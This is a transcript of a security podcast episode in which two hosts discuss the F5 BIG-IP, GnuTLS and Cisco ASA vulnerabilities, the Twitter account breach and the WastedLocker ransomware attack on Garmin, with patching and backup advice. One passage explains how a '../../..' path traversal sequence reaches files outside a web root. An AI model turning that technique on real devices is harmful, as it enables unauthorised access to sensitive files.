STEVE:  ...exactly what I'm looking for, you know, like 640 is...



LEO: Yeah, because you know in your head what 640 is, that's why. 



STEVE:  Exactly.



LEO:  Yeah, yeah.



STEVE:  Exactly.



LEO:  Occasionally, if I want to turn the execute bit on, I'll just do u+x.



STEVE:  Yeah.



LEO:  But most of the time it's easier just to do the number.  I agree with you.



STEVE:  So we've got an interesting episode.  Nothing really stood out, and one thing that's interesting has happened in this past week is that some truly surprising and interesting results have been emerging from what has turned out to be a hyper-accurate storage benchmark that I'm working on for the technology for SpinRite.  So there was some interesting - I just know that our listeners, odd as it sounds - and you, too, Leo.  When you see this stuff, you're going to be going, what the what?



Anyway, we're going to start with security.  We're going to look at the trouble that F5 Networks' BIG-IP devices are now having.  We talked about this at the beginning of the month when it was a warning that, uh-oh, patch.  We're going to update on the, what is it, I guess two weeks ago now epic Twitter hack.  There's more information coming to light.  We're going to look at an important security update for GnuTLS and those applications that are relying on it, and hopefully either have been patched or will be soon because there's a glaring problem.



We're going to cover the big five-day Garmin "outage," in quotes.  And I'm going to break my promise - well, it wasn't a hard, set-in-stone promise - never to talk about ransomware again because when something significant happens, it's just I'm not talking about it every week anymore.  And we're also going to talk about Cisco's latest troubles.  I've had a pointer actually from BleepingComputer to a new Windows 10 debloater app, and we have a bit of errata.



Then, as I mentioned, I want to wrap up by sharing some of the really interesting results that are emerging as a result of the fact that I've ended up developing what is turning out to be what I would describe as a hyper-accurate storage benchmark.  We're getting results accurate to four significant digits, and it's revealing some surprising things about our mass storage.  So I think an interesting podcast for our listeners.



LEO:  Yeah, you know, ransomware feels like it's gotten nastier and worse.



STEVE:  Oh, Leo.



LEO:  Yeah.  It just really feels that way, doesn't it.  It's like we knew it would get worse, but yeah.



STEVE:  Yeah, it's time for us to talk about it.  We need to touch in on it again because it really has.



LEO:  I've got a picture.



STEVE:  We have a picture.  And it's, first of all, I should describe it.  We have a somewhat unhappy, shocked-looking computer user who's staring at the screen, which is announcing, "You have 10 updates."  And it says, "6 slow your PC down.  3 look very dodgy.  1 randomly changes all your PC settings."



LEO:  Must be using Windows 10.



STEVE:  Well, yeah.  And so on one hand there's the cartoon itself.  But what occurs to me is sort of the meta level, which is that some cartoonist created this cartoon because it's now, like, in the popular culture.  I mean, it's enough of a problem that it's not...



LEO:  Good point, yeah.



STEVE:  ...geek land talking about this.



LEO:  It's not just us, yup.



STEVE:  Yeah.  It's like, oh, I mean, like everybody knows this.  It's like this is not going to be good for me.  I mean, I have to do it, I guess.  Well, actually now it's not a guess.  Yes,  you know, Microsoft will make you do it.  But you do it, and random things happen, which aren't clearly in the customer's best interest.  So anyway, I just - I thought it was interesting.  Not only that yes, okay, sure, you know, funny cartoon.  But the fact of the funny cartoon, you know, the fact that somebody is drawing a cartoon that says this, says wow, we're not really doing a service for our customers in the industry all the time.



So at the very end of last month, I think it was June 30th, F5 Networks released a critical patch for their so-called BIG-IP systems.  It was a "maximum vulnerability" is the way it was termed, remote code execution flaw that they disclosed...



LEO:  That's right.  They don't get worse than this, baby.



STEVE:  ...in their so-called "TMUI," the Traffic Management User Interface of the BIG-IP - which is actually like a trademark, I don't know what it stands for, I mean, IP we know, Internet Protocol, but BIG, maybe it stands for something other just big - their application delivery controller, ADC.  They go to initials here.  Anyway, this came to light as a consequence of F5 publishing this patch.  And with it was an urgent call for users of these so-called BIG-IP systems to immediately update with the highest possible priority.  And F5's customers using these BIG-IP solutions are governments; Fortune 500 firms; banks; service providers; well-known brands including Microsoft, Oracle, and Facebook.  I mean, this is big iron.



So as we noted at the time, F5's website boasts that 48 of the Fortune 50 rely on F5.  So somehow they missed two of the top 50 companies in the U.S.  And at the time of the disclosure, so not quite but almost a month ago, more than 8,000 of these BIG-IP F5 Networks devices were found online publicly accessible on the Internet and vulnerable to attacks designed to exploit this vulnerability.  U.S. Cyber Command independently urged F5 customers to patch their devices urgently.  They tweeted:  "Patching CVE-2020-5902 and 5903 should not be postponed over the weekend.  Remediate immediately."  



LEO:  Wow.



STEVE:  F5 also offered some interim mitigation measures that they recommended for their customers who could not for whatever reason patch their BIG-IP equipment immediately.  You know, sometimes that requires you take it down for some length of time and reboot.  But it later came to light that the mitigation could be mitigated and bypassed, which made emergency patching the only safe course, like do it now.



So two days after the patches for this critical vulnerability were released, researchers started publicly posting proof of concept exploits showing just how easy it would be to exploit them.  So that was then.  Three weeks later, last Friday the 24th, the Cyber and Infrastructure Security Agency (CISA) posted, they said:  "CISA is issuing this alert in response to recently disclosed exploits that target F5 BIG-IP devices that are vulnerable to" blah blah blah.



"Unpatched F5 BIG-IP devices are an attractive target for malicious actors.  Affected organizations that have not applied the patch to fix this critical remote code execution vulnerability risk an attacker exploiting that CVE to take control of their system.  Note:  F5's security advisory states that there is a high probability that any remaining unpatched devices are likely already compromised.  CISA expects to see continued attacks exploiting unpatched F5 BIG-IP devices and strongly urges users and administrators to upgrade their software to the fixed versions.  CISA also advises that administrators deploy the signature included in this alert to help them determine whether their systems have been compromised."  And so the signature was a traffic inspection script in order to see whether there was bad stuff going on.



They said:  "CISA has observed scanning and reconnaissance, as well as confirmed compromises, within a few days of F5's patch release of this vulnerability.  As early as July 6th, CISA has seen broad scanning activity for the presence of this vulnerability across federal departments and agencies.  This activity is currently occurring as of the publication of this alert."  Meaning, okay, from as early as July 6th is when it began.  And this alert was last Friday the 24th.  So this has been going on.



They conclude:  "CISA has been working with several entities across multiple sectors to investigate potential compromises relating to this vulnerability.  CISA has confirmed two compromises and is continuing to investigate.  CISA will update this alert with any additional actionable information."



Okay.  So this is a classic example.  And actually this sort of ties into where we'll be going here in a minute when we talk about Garmin.  I've often been speaking about the growing critical need for companies, and to a lesser degree individuals, but certainly individuals who care, to be certain that they have and are maintaining an open channel of communication for receiving vulnerability notices.  I've been talking about email as that channel.  But in thinking about this further, I think that Twitter likely makes the most sense now.



As I noted last week, Twitter really has become our global information dissemination platform, warts and all, for better or for worse.  No one imagines that the announcement of critically patched vulnerabilities won't immediately be public anyway.  Typically these things are made public, and any company that tried to send out email to a large customer base thinking that it would not end up immediately coming to everyone's attention is nuts.  So it ought to be broadcast.  I'm sure the bad guys have signed up to receive vulnerability announcements in email from all of these providers anyway, and no one is making sure that an announcement like this is not going out.  The CVEs are overtly public.



So it seems to me the way this needs to work is for technology companies, that is, who are producing these things, to create an authenticated vulnerability announcement Twitter account which never contains corporate promotional nonsense.  It's in the companies' interest to keep that vulnerability announcement channel named specifically for that purpose and clean and dedicated to nothing but the disclosure of the availability of important updates to correct, you know, which are meant to correct important security vulnerabilities.  And it should be seen as beneficial to its reputation that it's committed to getting this news out as quickly as possible, in a flash fashion.



You know, I mean, the one thing they could do would be to time it so that the areas where it's most likely to be affected are awake.  So, you know, don't send it out at 2:00 a.m.  That's not going to be good.  Wait till maybe after morning coffee, give that a chance to take hold.  And a company's record of its disclosure of these things over time, evidenced by its past feed of such things, should be a point of pride for the company and seen as an aspect of security for its prospective and ongoing customers.



And if an enterprise's entire IT security team were to subscribe to the security vulnerability Twitter feeds of the set of vendors whose hardware and software they're using, then even if one person missed it because they were in the car or driving, I mean, the point is, if it's a broadcast, it's not going to one person who got laid off last week and corporate IT forgot to keep looking at that person's corporate email for important alerts.  Instead, everybody in the security team gets it.  Somebody is going to escalate this thing and take action when they should.



It's just the model we're seeing now is that it is a race.  And every month now, or week, we see instances where something important occurs.  The bad guys are now, I mean, they're organized.  They arguably are more organized than IT that's got other stuff on its plate than just doing security vulnerability remediation.  They're trying to move other strategies forward.  The bad guys have nothing but badness that they're looking at.  So I just think it's really worth thinking about how, as somebody in IT, you can give your company an edge.



And on the flipside the companies that are producing this should not be sending this feed out in their standard PR, where the feed ends up being bogged down with all kinds of other stuff.  That doesn't invite its attention.  And a company producing a security alert on a Twitter account wants it to be an account for that purpose.  That way on the receiving end the IT team can be subscribing to these things and know they're important and not have them just buried in a bunch of noise.  So I just, you know, email, yes, that, too.  But I just think it's important for announcements to get out, more now than ever.



And speaking of Twitter, it's obvious in retrospect that if high-profile accounts were compromised so that attackers were able to obtain login access, they would or could have also nosed around in the normally private DM channels of those accounts.  It's not something that was talked about last week, but it has since come to light.  That is, not only were those compromised accounts used for sending out that two-for-one bitcoin deal, which was crazy, but it did try to make some money.  And as we know, the transfers of, what, $240,000 in bitcoin generated by that little brief campaign was blocked, to everyone's benefit.  Twitter updated, I don't remember when it was.  Oh, on the 22nd, which is Wednesday last week.  They updated their original blog posting, adding this little bit of information.



They said:  "We believe that for up to 36 of the 130 targeted accounts, the attackers accessed the DM inbox, including one elected official in the Netherlands."



LEO:  Remember, they said eight at first.



STEVE:  Uh-huh.  Right.  Right.  And they said:  "To date, we have no indication that any other former or current elected official had their DMs accessed."  So not surprisingly, the news that some of the world's most influential people probably had their personal messages read by hackers who are still unknown, at least publicly to us, will put additional pressure on Twitter to better protect its users.  And U.S. Senator Ron Wyden - who's generally one of the more technically savvy politicians, you know, he's on top of these various issues of encryption and technology and so forth.  He said that he has pushed Twitter's CEO, of course Jack Dorsey, to protect direct messages with end-to-end encryption.



Ron said:  "Twitter DMs are still not encrypted, leaving them vulnerable to employees who abuse their internal access to the company's systems, and hackers who gain unauthorized access.  If hackers gained access to users' DMs, this breach could have a breathtaking impact for years to come."  And of course from Twitter's standpoint, it would be a big feather in its cap if it could boast true end-to-end encryption for private DMs.



The idea, of course, would be that neither Twitter nor anyone else except the tweet's intended recipient would be able to read the tweets.  And thinking of it from a standpoint of a crypto challenge, I'd love to be given the job of designing that system since it represents a number of interesting challenges.  But probably the best person anywhere would be Matthew Rosenfeld, whom we commonly refer to as Moxie Marlinspike.  



LEO:  I didn't know that was his real name.



STEVE:  Matthew, or rather Moxie, and his crypto team at Signal, would be best suited to designing end-to-end encryption for Twitter.  I still recall how weirdly overdesigned the Signal protocol appeared to me at first when I was digging into it for our in-depth episode on that.  But that feeling morphed into deep technical appreciation once I saw that their crypto - what it was that their crypto ratchet and other mechanisms that they had created, what features and flexibility it enabled.  And that's the sort of design expertise and inevitable crypto mistake sidestepping that Twitter needs.  If anyone out there at Twitter is listening, and if you have any interest in following up on Ron Wyden's end-to-end encryption suggestion, please, please, please don't roll your own brand new ad hoc solution.  I'll bet Moxie and his team would welcome a new and high-profile challenge.



And Leo, what has Twitter talked about with regard to security? Do you know if this is on their plate?



LEO:  You know, I don't understand how encryption, I mean, it would only be for DMs, obviously.



STEVE:  Only DMs.



LEO:  Because anything public there'd be no point.



STEVE:  And it would have to be per device.  It would be tied to devices.



LEO:  I don't know why they should, to be honest, since Signal exists.  I think it's bending Twitter to do something different.



STEVE:  That it's really not suited for?  So like nobody should receive or send, like, sensitive content over DMs?



LEO:  No.  Well, we know you shouldn't do that.  Right now that's clearly a bad idea.  And I hate to give people the impression that it would be safe to do so.  I mean, of course, if they enabled the Signal protocol, that would be.  But, you know, there's ways to enable it that maybe are less secure.  You know, WhatsApp uses the Signal protocol.  But does that mean that Facebook doesn't have the keys?  I don't know if the keys are device-only.  So it's an interesting question.  I don't know.  Yeah, I mean, if you're going to do it, that's the way to do it.  You're absolutely right.  I think it's a mistake to just say, look, we have a secure messaging system built within Twitter.  It just doesn't seem like part of the mission.



STEVE:  Right.  And it does feel like it doesn't fit with Twitter's inherently sort of open...



LEO:  Right.  It's public, yeah.



STEVE:  ...casual approach.



LEO:  DMs to me on Twitter are properly used as a way to take a battle with another person private.  Say, look, let's just handle this in DMs; or waving at somebody; or saying, hey, let's talk.  I'm not sure it should be used for private communications.



STEVE:  Yeah.  For me, I think, although I famously don't follow anyone, I know from looking at other people's feeds, they're following 1,300 people.  And so for me a DM is a means of bringing something to someone's attention that I would like them not to miss.  And in fact I know that's the way our listeners use DMs to me is for exactly that purpose.  It's like, Steve, you know, this...



LEO:  Well, they do that because you're not following anybody. 



STEVE:  Right.



LEO:  Because they could "at" you in a public way which is where most people do that on Twitter.



STEVE:  And I do watch that.  I watch all of our listeners "atting" SGgrc, and so I sort of - I see those things go by. 



LEO:  Right.



STEVE:  But were I following hundreds of people who are tweeting, it's like it would be just easy to see it, you know, to lose it in the scroll.



LEO:  That's true, yeah.  Yeah, I mean, I guess there's no reason not to do it if it's implemented properly.  You know, what Twitter's really trying to do, I mean, bottom line, besides the embarrassment of not getting hacked, is to make money.  And they've had a hard time figuring out how to do that.  Their advertising isn't working very well for them.  They had a tough quarter again.  Now they're looking at a subscription model.  So maybe that would be a subscription feature.  And then encrypted direct messaging.



STEVE:  Well, and we know that they gave up on SMS.  So they had to give up on SMS.  Used to be able to send a DM via SMS.



LEO:  That would be inherently insecure.



STEVE:  But that says no client on the sender's side.  So we can't do end to end that way.



LEO:  Yeah, I mean, maybe they will do it.  It's interesting, yeah.



STEVE:  So we've often referred to OpenSSL as the standard.  But as we know, it's becoming quite long in the tooth.  Professor of Cryptography Bill Buchanan recently summed up the situation with OpenSSL, writing in Medium, he said:  "OpenSSL has caused so many problems in the industry, including the most severe with Heartbleed.  The problem with it is that it has been cobbled together and maintained on a shoestring budget."  And we've talked about this in the past.  That's exactly the case.  Many developers come and go.  They're working on this or that extension to SSL, so they swing by the OpenSSL Project, graft on their new widget for live testing because it's like a great armature for that.  Then they leave it hanging there without anyone to care for it moving forward.  And it's really kind of amazing that it's done as well as it has.



As a consequence, today where there was once one, there are now many.  Google forked OpenSSL to create - I love the name - BoringSSL.  The OpenBSD project also forked it to create LibreSSL.  And Leo, you and I talked about how Amazon took a different approach for securing the communications to their cloud services by creating a minimal subset of the whole named "s2n."  And remember that that stands for "signal to noise" because the point was OpenSSL is so much code to do TLS that if you just said, let's start over, you could get a much better signal-to-noise ratio for your library.



And then just recently Google has created and released something we have not spoken about before, which is Tink, T-I-N-K, which is their new multilanguage cross-platform crypto library that can do TLS connections and gives applications access to that security.  So there's all of those.  And then there's GnuTLS, which is the subject here.  It was first created a little over 17 years ago back in 2003.  That happened as a means for allowing the GNU Project applications the ability to communicate securely over SSL and TLS.



Although OpenSSL existed at the time, OpenSSL's license was not compatible with the GPL.  Therefore software licensed under the GPL, such as all of GNU's software, could not use OpenSSL without making a GPL linking exception.  The GnuTLS library was licensed originally under the GNU Lesser General Public License version 2, which included applications using the GNU General Public License.  Then in August of 2011, the library was updated to LGPLv3.  But once it was noticed that there were new license compatibility problems introduced, especially with other free software, with the license change, in 2013 the license was returned to version 2.1.



So that's where we are now.  One way or the other, under one license or another, GnuTLS has been around since 2003.  And, not surprisingly, it has found its way into a great many applications.  Just to get everyone's attention, I'll name a few:  apt; cadaver, which is WebDAV, essentially; cURL; Wget; Git; GNOME; CenterIM; Exim; WeeChat; MariaDB; Mandos; Mutt; Wireshark; Rsyslog; slrn; Lynx; CUPS; gnoMint; GNU Emacs; Slapd; Samba; the Synology DiskStation Manager; OpenConnect; and a whole bunch of various VNC implementations.  So, yeah, you know, it's the way you do TLS if you want something that's compatible with the GPL.  And this is why it's worth taking note and looking into the situation more closely, when the result of the recent audit of GnuTLS is summed up with two words, "Be afraid."



LEO:  Oh, boy.



STEVE:  It's not what you want...



LEO:  No.



STEVE:  ...from the auditors of your TLS library.  So Linux users need to determine how afraid they individually should be, if at all.  Maybe the things they've had are already patched because this is a few weeks ago.  NIST explains the problem very dryly by writing:  "GnuTLS 3.6.x before 3.6.14 uses incorrect cryptography" - which is a nice way of putting it, as we'll see - "for encrypting a session ticket," they said, "a loss of confidentiality in TLS 1.2, and an authentication bypass in TLS 1.3."  Neither of which you want in TLS, of course.  "The earliest affected version is 3.6.4" - which was released September 24th of 2018, they said - "because of an error in a commit at 2018-09-18.  Until the first key rotation" - after a connection to a TLS server based on this library - "it always uses wrong data in place of an encryption key derived from an application," based on the library.



So in other words, to make this a little less dry, when the news of these audit results broke, the cryptographer Filippo Valsorda, who's Google's security team lead for GO, their GO language, he tweeted:  "Don't rely on GnuTLS, please."  Then he says:  "CVE-2020-13777.  Whoops.  For the past 10 releases, most TLS 1.0-1.2 connections could be passively decrypted," meaning all you need to do is capture the traffic.  He says:  "And most TLS 1.3 connections intercepted trivially."  And he says, as an aside:  "Also, TLS v1.2-1.0 session tickets are awful."  But that's another issue.



So I have a link to the NIST announcement and the GnuTLS audit.  Someone who's hip to security quoted Filippo's tweet, and he wrote:  "You are reading this correctly.  Supposedly encrypted TLS connections made with affected GnuTLS releases are vulnerable to a passive cleartext recovery attack, and active for 1.3," meaning active attacks for TLS 1.3.  He says:  "But who uses that anyway?"  He says:  "This is extremely bad.  It's pretty close to just switching everyone to HTTP instead of HTTPS, more or less.  I would have a lot more to say about the security of GnuTLS in particular, and security in general.  But I am mostly concerned about patching holes in the roof right now," meaning how is he affected by this.



He says:  "So this article is not about that."  He says:  "This article is about figuring out what exactly was exposed in our infrastructure because of this."  So again, I have a link to his full coverage.  There are some, for example, if you are using Debian, there are some commands you can use with the package manager to quickly discover which packages you have installed which link to any of the affected versions of GnuTLS, which would tell you what you currently have.



As I said, this is now a few weeks ago.  So I would imagine that there's been a lot of GnuTLS updating and relinking and package reissuing and updates.  So the real takeaway for this is just make sure that the Linux you're running has been recently checked for any libraries that use GnuTLS, and that they've been updated.  And if you are a builder, if you're using it yourself, you want to make sure you are up to date with the latest because this was a really bad problem since I guess September of 2018, for all of the instances of GnuTLS that have been out there, a trivial plaintext attack on the initial cipher.  So very embarrassing.



Oh, and a bit later, summing things up, he writes:  "The impact of this vulnerability depends upon the affected packages and how they're used."  He says:  "It can range from 'Meh, someone knows I downloaded that Debian package yesterday' to 'Holy crap, my full disk encryption passwords are compromised.  I need to re-encrypt all my drives.'"  Because, for example, one of the things that relies on GnuTLS was - I mentioned it.  What was the name of that?  It's the disk encryption package, Mandos.  Oh, and including "I need to change all LDAP and MySQL passwords," which could have been impacted, too.  So anyway, just a heads-up for Linux users.  GnuTLS has probably been there, and you want to make sure that it's been updated since then.



The Garmin outage.  And I put "outage" in quotes because, okay, yeah.  I mean, technically that's correct.  A screenshot from Garmin.com anytime between last Wednesday, late last Wednesday, and probably Sunday, stated, red banner across the top:  "We are currently experiencing an outage that affects Garmin.com and Garmin Connect.  This outage also affects our call centers, and we are currently unable to receive any calls, emails, or online chats.  We are working to resolve this issue as quickly as possible and apologize for this inconvenience."



And then in the show notes I have "And Now."  And we can see this is a picture of my browser where the first tab is not in focus.  It says "Security Now! #777 - 07-28-2020."  And the tab next to it is www.garmin.com, which is updated.  It says:  "We are happy to report that many of the systems and services affected by the recent outage, including Garmin Connect, are returning to operation.  Some features still have temporary limitations while all the data is being processed."  And by that we probably mean decrypted.  "We'd like to thank all our customers for your patience and understanding.  Click for more details."



So as I mentioned at the top of the show, after last year's overkill on coverage of ransomware, because it was, you know, it just took off last summer, as I mentioned, I promised to stop mentioning this scourge of the industry week after week.  And I've been good since then, even though ransomware attacks form a constant background.  It's like, yeah, okay, fine, you know.  And it's true.  If some random dentist in Hoboken needs to cancel his appointments because his office has been hit, if indeed he's still in business after the novel coronavirus hit, and I agree that there are more pressing matters for this podcast's attention.



However, when a high-profile, highly networked, Internet-connected and Internet-dependent giant like Garmin gets its servers encrypted and needs to go dark, well, that's worthy of a mention.  The troubles began late Wednesday and early Thursday morning as customers reported being unable to use a variety of their services.  This came as no surprise to Garmin, and they tweeted at the time.  I grabbed their tweet for the show notes.  Basically it amounts to the message that they put across the banner of their website, so I won't read it again.



This service failure left their millions of customers unable to connect their smart watches, their fitness trackers, and whatever other devices to Garmin's servers and network that provided location-based data in some cases to make them work.  And although many within the industry suspected exactly what it turns out by all reports internal and external did happen, Garmin's post yesterday was the first the company provided, yesterday as in Monday the 27th.  Garmin's post was the first that actually gave us an official notification of what caused the worldwide outage.



They said:  "Garmin Ltd. was the victim of a cyberattack that encrypted some of our systems on July 23rd, 2020.  As a result, many of our online services were interrupted, including website functions, customer support, customer facing applications, and company communications.  We immediately began to assess the nature of the attack and started remediation.  We have no indication that any customer data, including payment information from Garmin Pay, was accessed, lost, or stolen.



"Additionally, the functionality of Garmin products was not affected, other than the ability to access online services.  Affected systems are being restored, and we expect to return to normal operation over the next few days.  As our affected systems are restored, we expect some delays as the backlog of information is being processed.  We're grateful to our customers' patience and understanding during this incident and look forward to continuing to provide the exceptional customer service and support that has been our hallmark and tradition."



So screenshots which appeared and other data posted by employees suggested the ransomware was a relatively new strain called WastedLocker.  A person with direct knowledge of Garmin's response over the weekend confirmed that WastedLocker was indeed the ransomware used.  The person spoke on condition of anonymity to discuss this confidential matter with the technical press.  WastedLocker first came to public attention just 2.5 weeks ago, on July 10th, when Malwarebytes published what they called one of their "Threat Spotlight" profiles.  I have a link to the entire Threat Spotlight in the show notes for anyone who wants the full details.  In their Spotlight, Malwarebytes said that WastedLocker attacks are highly targeted against organizations chosen in advance.  And what we're about to learn, exactly as you were saying, Leo, this represents a change in the terrain and the application and deployment of ransomware.



So they said:  "...highly targeted against organizations chosen in advance.  During the initial intrusion, the malware conducts a detailed analysis of active network defenses so that subsequent penetrations can better circumvent them."  So this is no longer an opportunistic botnet spray looking for things to affect.  This is different.



Pieter Arntz, a Malwarebytes researcher, wrote:  "In general we can state that, if this gang has found an entrance into your network, it will be impossible to stop them from encrypting at least part of your files.  The only thing that can help you salvage your files in such a case is if you have either rollback technology or a form of offline backups.  With online or otherwise connected backups, you run the chance of your backup files being encrypted, as well, which makes the whole point of having them moot.  Please note that the rollback techniques are reliant on the activity of the processes monitoring your systems, and the danger exists that these processes will be on the target list of the ransomware gang, meaning that these processes will be shut down once they gain access to your network."



So Malwarebytes' posting also notes:  "WastedLocker is a new ransomware operated by a malware exploitation gang commonly known as" - and I'm not kidding - "Evil Corp, the same gang that is associated with the Dridex and BitPaymer malware.  The attribution is not based on the malware variants, as WastedLocker is very different from BitPaymer.  What was retained was the ability to add specific modules for different targets.  The attacks performed using WastedLocker are highly targeted at very specific organizations.  It is suspected," they wrote, "that during a first penetration attempt, an assessment of active defenses is made; and the next attempt will be specifically designed to circumvent the active security software and other perimeter protection which the initial foray found to be in use.



"This effort represents a new and clear escalation of the ransomware scourge.  We're no longer looking at opportunistic attacks which ask for some fraction of a bitcoin.  If reports are to be believed, including the U.S. Department of the Treasury, the bad guys are now highly organized Russian cybercriminal gangs.  They're not screwing around.



"The name 'WastedLocker' is derived from the filename it creates, which includes an abbreviation of the victim's name and the string 'wasted.'  For each encrypted file, the attackers create a separate file that contains the ransomware note.  The ransom note has the same name as the associated file with the addition of '_info.'  Once the WastedLocker gang have taken hold in a network, their demands typically range from 500,000 to $10 million."  And as we know, Leo, sometimes even more.  "So this is the new face of international cybercrime extortion.  If hackers delete or steal a company's data, there's nothing to extort.  But if hackers encrypt a corporation's data, they're able to dangle the carrot of the decryption key.  It's diabolical."



Garmin's notice yesterday did not employ the terms "ransomware" or "WastedLocker," but the description "cyber attack that encrypted some of our systems," all but definitively confirms that ransomware of some sort was behind the outage.  And we have disclosures from unnamed but presumably reliable Garmin insiders to further confirm it.  We all want to know whether or not Garmin paid up or restored from backups; and, if they anted up, what did they pay?



Sky News, citing a number of unnamed security sources, reported that Garmin did obtain the decryption key.  And that report matched what the person with direct knowledge told members of the tech press, as well.



LEO:  So they paid.  They paid.



STEVE:  Yup.  Sky News said Garmin "did not directly make a payment to the hackers," but did not elaborate further.  However, as we've discussed on the podcast before, there are now middleman agencies who negotiate on behalf of their ransomware victim clients.  Payment may have been made through such an intermediary.  Garmin's representatives declined to provide confirmation that the malware was WastedLocker and whether or not the company paid ransom.  And you know there's no benefit to them elaborating.  And in fact it might actually cause them some trouble.



On December 5th of last year the U.S. Department of Treasury officially sanctioned Russia's Evil Corp, citing a Russia-based cybercriminal group as being behind the Dridex malware.  The U.S. Treasury Department's announcement started off by saying:  "Today, the U.S. Treasury Department's Office of Foreign Assets Control (OFAC) took action against Evil Corp, the Russia-based cybercriminal organization responsible for the development and distribution of the Dridex malware.  Evil Corp has used the Dridex malware to infect computers and harvest login credentials from hundreds of banks and financial institutions in over 40 countries, resulting in more than $100 million in theft."



And it goes on, but that's enough to give us a taste for it.  So the U.S. Treasury's action could complicate Garmin's position with respect to Evil Corp.  Presumably, if a company is sanctioned, U.S. businesses are no longer allowed to have any commerce with it, and I guess one could argue that this paying extortion is commerce.  So anyway, today Garmin's services are now mostly back online.  As we know, and as we've commented before, attacks are driven by motivation.  And few things motivate like cold, hard cash.



Ransomware has emerged as an insidious but viable technique for the extraction of cash from those who have it and those who have been caught without adequate failsafe fallbacks in the event of such an intrusion.  And as our listeners know, when ransomware first appeared, we covered it on the podcast, and our reaction was "Uh-oh."  Because it was clear that in-place encryption, coupled with cybercurrency, enabled this significant new threat.  And now to that we add tightly targeted attacks launched by international organized cybercrime groups.  So staying current with security updates, keeping employees on guard against intrusion spoofs, which as we know is the way 90% of these intrusions begin, and maintaining offline backups in the case bad guys get in anyway is the order of the day.  And thus ends our ransomware reminder wakeup call for 2020.



LEO:  Geez.  Oh, lord.



STEVE:  It's really a problem, Leo.  I mean, we've talked about how porous security inherently is; that if somebody wants badly enough to get in, they can find a way.  And it's clear that we know nothing about the way they got in at Garmin.  We did discover ultimately how Sony was breached.  It's typically somebody doing something they shouldn't on the inside.  But, boy, is it expensive.  And we saw government institutions last year, lots of school districts that are cash strapped and didn't have the money to invest in IT.  I mean, it's expensive to create.  And it's difficult, too.



Think about all the workstations that are spread throughout a company like Garmin, where something, some malware could get a foothold, then start looking around, map out the network, figure out where things are, laterally move within the network unseen until they figure out exactly what's going on.  And then I'm wondering why they didn't wait until late Friday night, why the attack took place on a Wednesday night.  It would seem to me that the weekend is more disruptive.  But anyway, I don't want to give them any ideas.  Just amazing.



LEO:  Incredible.



STEVE:  So Cisco.  Unfortunately, speaking of going where the money is and limiting ingress to high-value targets, we have the sad patching status of Cisco's most recent critical vulnerability within tasty enterprise-grade devices.  And when I tell you that it's yet another directory path traversal mistake, everybody try not to roll your eyes.  It is.  Last Wednesday the 22nd, Cisco released their security advisory with a CVSS score of 7.5.  That's seeming somewhat worse, or things are seeming somewhat worse than that today.



Cisco's advisory reads:  "A vulnerability in the web services interface of Cisco Adaptive Security Application and Cisco Firepower Threat Defense software could allow an unauthenticated remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system.  The vulnerability," they wrote, "is due to a lack of proper input validation of URLs in HTTP requests, processed by an affected device.  An attack could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device.  A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device.



"The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying OS files."  They said:  "Cisco has released software updates that address this vulnerability.  There are no workarounds that address it."  Then, in an update to this initial disclosure, they said:  "Note:  Cisco has become aware of the availability of public exploit code and active exploitation of the vulnerability that is described in this advisory.  Cisco encourages customers with affected products to upgrade to a fixed release as soon as possible."



Well, over time, this podcast has compiled a few golden rules of cybersecurity.  I may not have explicitly stated this one, but it clearly ranks among the most important.  Web interfaces are dangerous.  Don't use them.  Oh, yeah, they're pretty, and they mean that the IT guys don't need to read yet another boring manual listing confusing-looking commands.  No, a web interface means that you can just fire it up and poke around in the menus until you find the button you're looking for, then press it.  Unfortunately, so too can the bad guys.



And one well-established golden rule, as we know, is that interpreters are incredibly difficult to make perfect.  Yet perfection there is required because the job being performed by most interpreters asks them to interpret untrusted content.  And the interpreter in any web server is right up there in complexity and exploitability with that of any multimedia codec that we've run across.  So a web server is an interpreter, though it is inherently facing the public Internet, and it is inherently accepting untrusted content from anybody who wants to send an HTTP URL.



Well, it turns out that this one also has a directory traversal vulnerability, meaning that you're able to put in the URL, as we know, ../../../.. in order to back out of the root directory of the HTTP server, back to the actual root of the file system, and then move forward down a different branch of the directory that you're never supposed to, as a remote untrusted user on the Internet, get to.



So Mikhail Klyuchnikov of Positive Technologies, who was credited with independently reporting this flaw, along with Ahmed Aboul-Ela who's with RedForce, said this vulnerability is highly dangerous.  The cause is a failure to sufficiently verify inputs.  An attacker can send a specially crafted HTTP request to gain access to the file system, which stores data in RAM, the so-called RamFS.



So last week, at the time of the disclosure, no attacks were known to be underway, but Ahmed Aboul-Ela of RedForce released a proof of concept which demonstrated the vulnerability, and he's been tweeting up a storm of example ways to exploit the flaw ever since.  The bad news is it's horrifically easy to exploit this problem - this is Cisco - and also horrifically trivial to find vulnerable targets.



Which brings us to the state of affairs as of today.  It's not good.  As the update to Cisco's vulnerability announcement noted, attacks are underway.  Rapid7 jumped on this and took a look at what it meant.  In their report from last Thursday, they noted:  "Rapid7 encourages immediate patching of vulnerable ASA/FTD installations to prevent attackers from obtaining sensitive information from these devices which may then be used in targeted attacks."  In other words, exactly what the Evil Corp in Russia cyber gang is looking for.  Rapid7 said, echoing Cisco:  "There are no workarounds that address this vulnerability."  Meaning, you know, it's a core problem in the parser, the URL parser of the HTTP web server in these Cisco appliances.  Rapid7 said:  "Cisco has provided fixes for all supported versions," blah blah blah.  



Rapid7's Project Sonar discovered just over 85,000, Leo, of these ASA/FTD devices.  And 398 of them are spread across 17% of the Fortune 500.  Since it is difficult, if not impossible, to legally fingerprint Cisco ASA/FTD versions remotely, in other words so as to determine what version they are running, Rapid7 Labs revisited what's known as the "uptime technique" described in a 2016 blog post for another Cisco ASA vulnerability a couple years ago, four years ago.  That shows, using the uptime technique, it shows that only 10% of affected Cisco devices have been rebooted since the release of this patch.  In other words, 10% of 85,000 vulnerable devices have been rebooted since the release of the patch.



